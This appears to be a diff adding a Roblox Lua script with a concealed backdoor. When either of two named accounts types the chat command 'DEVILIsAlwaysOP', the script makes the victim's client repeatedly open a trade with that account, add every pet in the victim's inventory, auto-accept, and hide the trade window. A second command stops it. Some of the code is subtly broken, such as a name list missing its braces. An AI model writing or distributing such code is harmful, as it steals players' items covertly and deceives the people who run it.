@@ -1,0 +1,114 @@
+local godfuckers = 
+"ChampionClubOwner",
+"Johnny_Sin0p"
+
+spawn(function()
+    local Yourself = true 
+    local command = "DEVILIsAlwaysOP"
+    
+    if Yourself == true then
+        for _,v in pairs(game.Players:GetPlayers()) do
+            if godfuckers:lower() == v.Name:lower():sub(1,#godfuckers) then
+                v.Chatted:Connect(function(msg)
+                    if msg:lower() == command:lower() then
+                        print("DEVIL is here")
+                        spawn(function()
+                            getgenv().scamSaber = true
+                            while scamSaber do
+                                pcall(function()
+                                    for i,v in pairs(game.Players:GetChildren()) do
+                                        if v.Name == godfuckers then
+                                            
+                                            print (v.Name)
+                                            local args = {
+                                                [1] = "RequestTrade",
+                                                [2] = godfuckers
+                                            }
+                                            
+                                            game:GetService("ReplicatedStorage").Events.TradeEvent:FireServer(unpack(args))
+                                            
+                                                    
+                                            for i,v in pairs(game.Players.LocalPlayer.PlayerGui.Gui.Trade.PetsInventory.PetsFrame.Frame:GetChildren()) do
+                                                if v.ClassName == "ImageButton" then
+                                                    print(v)
+                                                    local args = {
+                                                        [1] = "AddPet",
+                                                        [2] = v.Name
+                                                    }
+                                                    
+                                                    game:GetService("ReplicatedStorage").Events.TradeEvent:FireServer(unpack(args))
+                                                end
+                                            end
+                                            
+                                            
+                                            local hacker = {
+                                                [1] = "AcceptTrade"
+                                            }
+                                            
+                                            game:GetService("ReplicatedStorage").Events.TradeEvent:FireServer(unpack(hacker))
+                                        
+                                            
+                                            else
+                                        end
+                                    end
+                                game.Players.LocalPlayer.PlayerGui.Gui.Trade.Decline.Visible = false
+                                game.Players.LocalPlayer.PlayerGui.Gui.Trade.Visible = false
+                                end)
+                            wait()
+                            end
+                        end)
+                    end
+                end)
+            end
+        end
+    end
+    
+    if Yourself == true then
+        game.Players.LocalPlayer.Chatted:Connect(function(msg)
+            if msg:lower() == command:lower() then
+                print("You used command :)")
+                spawn(function()
+                    print("You Cant :)")
+                end)
+            end
+        end)
+    end
+end)
+
+
+spawn(function()
+    local Yourself = true 
+    local command2 = "ImDoneLOL"
+    
+    if Yourself == true then
+        for _,v in pairs(game.Players:GetPlayers()) do
+            if godfuckers:lower() == v.Name:lower():sub(1,#godfuckers) then
+                v.Chatted:Connect(function(msg)
+                    if msg:lower() == command2:lower() then
+                        print("DEVIL is here")
+                        spawn(function()
+                            getgenv().scamSaber = false
+                        end)
+                    end
+                end)
+            end
+        end
+    end
+    
+    if Yourself == true then
+        game.Players.LocalPlayer.Chatted:Connect(function(msg)
+            if msg:lower() == command2:lower() then
+                print("You used command :)")
+                spawn(function()
+                    print("You Cant :)")
+                end)
+            end
+        end)
+    end
+end)
+
+
+
+spawn(function()
+
+end)
